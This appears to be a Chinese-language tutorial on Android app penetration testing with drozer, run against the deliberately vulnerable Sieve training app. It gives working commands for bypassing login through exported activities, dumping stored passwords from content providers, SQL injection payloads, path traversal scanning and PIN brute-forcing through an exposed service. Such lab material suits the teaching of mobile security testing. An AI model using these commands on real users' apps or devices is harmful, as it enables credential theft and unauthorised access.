一.环境准备

  • windows10系统

  • 夜神模拟器

  • python2.7(是使用python2.7编写的)

  • jdk1.8

  • adb，Android Debug Brige，安装了模拟器的话就自带了的，也可以单独安装

  • drozer，下载地址：https://github.com/mwrlabs/drozer/releases/

二.安装

2.1下载安装drozer

我下载的安装包和drozer-agent，安装的时候一定要选择python2，安装完成之后会在python2的scripts目录下生成以下文件


下载地址：

https://github.com/FSecureLABS/drozer/releases/download/2.4.4/drozer-2.4.4.win32.msihttps://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk


2.2 创建adb和夜神模拟器之间的连接

1.打开模拟器-->设置-->关于平板电脑-->版本号(连续点击五次版本号即可激活开发者模式)

2.返回到开发者模式-->打开USB调试功能


3.进入夜神模拟器安装目录的bin目录(adb在这里)

4.输入：nox_adb.exe connect 127.0.0.1:62001即可以连接到adb


adb 命令：
adb devices，显示连接上的设备
adb version，查看adb版本
adb get-serialno 获取连接到的手机的序列号

5.使用adb将drozer agent安装到手机，下载地址：

https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apkadb.exe install drozer-agent-2.3.4.apk

6.在手机端开启drozer agent


三.安装python依赖库

pip install protobuf pyOpenSSL twisted service_identity pyyaml


四.打开控制台

1.要先使用adb端口转发一下

adb forward tcp:31415 tcp:31415  (31415为dozer占用的端口号)


2.打开控制台

drozer.bat console connect


五.drozer的基本命令操作

开始一个会话
adb forward tcp:31415 tcp:31415
drozer console connect

检索包信息

run app.package.list -f <app name> #检索应用程序run app.package.info -a 包名 #列出应用程序的基本信息run app.package.attacksurface 确定安装包的可攻击面run app.package.backup 列出可备份的包run app.package.debuggable 列出可debug的包run app.package.info 获取已安装包的信息run app.package.launchintent 获取程序启动的activity信息run app.package.list 手机已安装的程序包run app.package.manifest 获取程序manifest文件信息run app.package.native 列出Native libraries 信息


识别攻击面

run app.package.attacksurface 包名


开发活动

run app.activity.info -a 包名 -urun app.activity.start --component 包名 组件名


利用内容提供商

run app.provider.info -a 包名 #获取content providers信息run scanner.provider.finduris -a 包名 #获取所有可以访问的URL，信息泄露run app.provider.query <uri>  #查询content provider内容run app.provider.update <uri> --selection <conditions> <selection arg> <column> <data> #更新content provider的内容run scanner.provider.injection -a 包名 #注入点扫描,查找存在注入的点run scanner.provider.sqltables -a 包名 #列出该app的表名run scanner.provider.traversal -a 包名
run app.provider.columns #展示content provider URI的各列run app.provider.delete #删除content provider URI的内容run app.provider.download #使用openInputStream读取指定uri的内容，并下载在电脑中run app.provider.insert #插入数据到content providerrun app.provider.read #使用openInputStream读取指定uri的内容


利用广播接收器

run app.broadcast.info -a 包名 #获取broadcast receivers信息run app.broadcast.send --component 包名 组件名 --extra <type> <key> <value> #发送广播run app.broadcast.sniff --action <action> #嗅探广播中intent的数据


开发服务

run app.service.start #开启服务run app.service.stop #停止服务run app.service.info -a 包名 #获取services的信息run app.service.start --action <action> --component 包名 组件名run app.service.send 包名 组件名 --msg <what> <arg1> <arg2> --extra <type> <key> <value> --bundle-as-obj #使用 Message攻击暴露的service，其service实现了handleMessage

在Python27\Lib\site-packages\drozer\modules\app\package.py中：

import sys
reload(sys)

6.2 查看基本信息

1.获取程序包名：run app.package.list -f sieve


2.查看程序包信息：run app.package.info -a com.mwr.example.sieve


得到数据存放路径：/data/data/com.mwr.example.sieve

3.获取攻击面：run app.package.attacksurface com.mwr.example.sieve


6.3 测试activity组件

activity组件简介：
应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。一个应用程序可以包含许多活动，比如事件的点击，一般都会触发一个新的Activity。Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。

1.获取activities信息

run app.activity.info -a com.mwr.example.sieve


com.mwr.example.sieve.FileSelectActivity #目录相关的包
com.mwr.example.sieve.MainLoginActivity #登录相关的包
com.mwr.example.sieve.PWList #密码相关的包


2.调用目录相关组件：

run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity



一些和存储相关的东西

3.调用密码组件：

run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList


在模拟器中可以直接看到绕过了密码验证，直接跳转到登录之后的页面了

说明在这里是存在漏洞的，认证绕过或者是越权


6.4 测试ContendProvider组件

ContentProvider(内容提供者)简介:
内容提供者主要用于在不同应用程序之间实现数据共享的功能，它提供了一套完整的机制，允许一个程序访问另一个程序中的数据，同时还能保证被访问数据的安全性。只有需要在多个应用程序间共享数据时才需要内容提供者。例如：通讯录数据被多个应用程序使用，且必须存储在一个内容提供者中。它的好处：统一数据访问方式。

1.获取 content provider组件信息：

run app.provider.info -a com.mwr.example.sieve


结果显示：对DBContentProvider内容提供器的访问，/Keys路径需要权限，其他都不需要权限；而对FileBackupProvider内容提供器的访问则不需要任何权限，那么我们就可以从中获取敏感数据。

2.信息泄露漏洞

扫描并获取Content Provider信息：

run scanner.provider.finduris -a com.mwr.example.sieve


可以看到信息：

run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/


3.sql注入漏洞

查询注入点：

run scanner.provider.injection -a com.mwr.example.sieve


测试注入点：

run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"，发现抱错，说明是存在注入的。


查询所有表信息：

run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"


获取具体表信息：

run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"



4.目录遍历

run scanner.provider.traversal -a com.mwr.example.sieve


6.5 测试Service组件

Service组件简介：
是Android中实现程序后台运行的解决方案，它非常适合去执行那些不需要和用户交互而且还要长期运行的任务（一边打电话，后台挂着QQ）。服务的运行不依赖于任何用户界面，即使程序被切换到后台，或者用户打开了另一个应用程序，服务扔然能够保持正常运行，不过服务并不是运行在一个独立的进程当中，而是依赖于创建服务时所在的应用程序进程。当某个应用程序进程被杀掉后，所有依赖于该进程的服务也会停止运行（正在听音乐，然后把音乐程序退出）

1.获取到Service组件的信息：run app.service.info -a com.mwr.example.sieve


AuthService:认证服务
CrytoService:加密服务

2.使用apktool工具对其进行反编译：apktool_2.5.0.jar d sieve.apk -o sieve



3.然后查看AuthService.smali中的handlemessage()方法：

经过分析可以得出以下2十六进制的数就是我们需要的值


4.调用AuthService破解PIN码

使用Message攻击暴露的service，其service实现了handleMessage,需要三个参数，前两个参数为上面得到的两个值，第三个用0即可。

参数：--extra TYPE KEY VALUE 指定附加的数据，再这里是用来制定要枚举的PIN值

run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 0 --extra string com.mwr.example.sieve.PIN 1111 --bundle-as-obj

当输入的PIN值不正确时就返回枚举输入的PIN值，当正确时返回主password:


6.6 测试Broadcast Receivers组件

Broadcast Receivers组件简介：
应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。

测试APP下载地址：

https://github.com/nvisium-jack-mannino/OWASP-GoatDroid-Project/downloads
